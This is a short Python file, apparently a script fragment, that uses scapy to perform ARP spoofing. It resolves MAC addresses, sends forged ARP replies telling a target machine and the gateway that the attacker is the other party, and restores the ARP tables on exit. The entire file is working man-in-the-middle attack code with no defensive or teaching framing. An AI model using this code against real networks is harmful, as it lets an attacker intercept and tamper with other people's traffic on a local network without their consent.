import scapy.all as scapy

def get_device_info(ip):
    """Helper to get MAC for the gateway or restore process."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    ans = scapy.srp(broadcast/arp_request, timeout=2, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc, "Known"
    return None, "Unknown"

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """Aggressive spoofing with hwdst to stop terminal warnings."""
    # Tell Target I am Router
    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Tell Router I am Target
    gateway_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    scapy.send(target_packet, count=4, verbose=False)
    scapy.send(gateway_packet, count=4, verbose=False)

def restore(destination_ip, source_ip):
    """Fixes the ARP tables when you quit."""
    dest_mac, _ = get_device_info(destination_ip)
    src_mac, _ = get_device_info(source_ip)
    if dest_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.send(packet, count=5, verbose=False)
